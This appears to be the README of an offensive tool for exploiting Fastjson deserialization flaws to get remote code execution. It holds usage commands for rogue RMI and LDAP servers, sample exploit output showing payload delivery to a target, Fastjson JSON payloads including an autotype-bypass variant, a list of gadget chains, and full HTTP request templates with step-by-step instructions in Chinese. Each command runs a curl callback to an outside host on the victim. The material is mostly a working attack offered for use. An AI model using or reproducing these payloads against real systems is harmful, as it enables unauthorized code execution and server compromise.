# fastjson_rce_tool

```
java -jar fastjson_tool.jar
Usage:
java -cp fastjson_tool.jar fastjson.HRMIServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn" 
java -cp fastjson_tool.jar fastjson.HLDAPServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn"
java -cp fastjson_tool.jar fastjson.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" 
java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099  CommonsCollections1 "curl dnslog.cn"


[root@ /]# java -cp fastjson_tool.jar fastjson.HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
[-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}
[-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xx.xx.xx.xx:80/Object","autoCommit":true}}
[-] Opening JRMP listener on 80
[-] Have connection from /xx.xx.xx.xx:33543
[-] Reading message...
[-] Is RMI.lookup call for Exploit 2
[-] Sending remote classloading stub targeting http://xx.xx.xx.xx:80/Object.class
[-] Closing connection
[*] Have connection from /xx.xx.xx.xx:33544 /Object.class
[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
[-] send payload done and exit.

[root@ /]# java -cp fastjson_tool.jar fastjson.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
[-] payload:  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}
[-] payload:  {"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}}
[-] LDAP Listening on 0.0.0.0:80
[*] Send LDAP reference result for Exploit redirecting to http://xx.xx.xx.xx:80/Object.class
[*] Have connection from /xx.xx.xx.xx:33548 /Object.class
[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
[-] remote target jdk version: java/1.7.0_79, use payload version: jdk7
[-] send payload done and exit.

===================================================================================================

if command need base64 encode, command should startwith bash=/powershell=/python=/perl=
example:  bash=curl dnslog.wyzxxz.cn

1. RMI (need tomcat8)
java -cp fastjson_tool.jar EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"


2. RMI/LDAP + HTTP
java -cp fastjson_tool.jar HRMIServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"
/
java -cp fastjson_tool.jar HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"


3. LDAP2
java -cp fastjson_tool.jar fastjson.LDAPRefServer2 80 CommonsCollections1 "curl dnslog.wyzxxz.cn"
CommonsBeanutils1  
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
Groovy1            
URLDNS             
JSON1              
Spring1            
Spring2            
file   （BASE64编码后的反序列内容文件）


```


```

rmi:
1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
java -cp fastjson_tool.jar fastjson.EvilRMIServer 1099 8888 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Object","autoCommit":true}

3. 查看日志是否curl成功

===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp fastjson_tool.jar fastjson.HLDAPServer xx.xx.xx.xx 80 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:80/Object","autoCommit":true}


3. 查看日志是否执行成功


===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099 CommonsCollections1 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xx.xx.xx.xx:1099/Object","autoCommit":true}


3. 查看日志是否执行成功






```

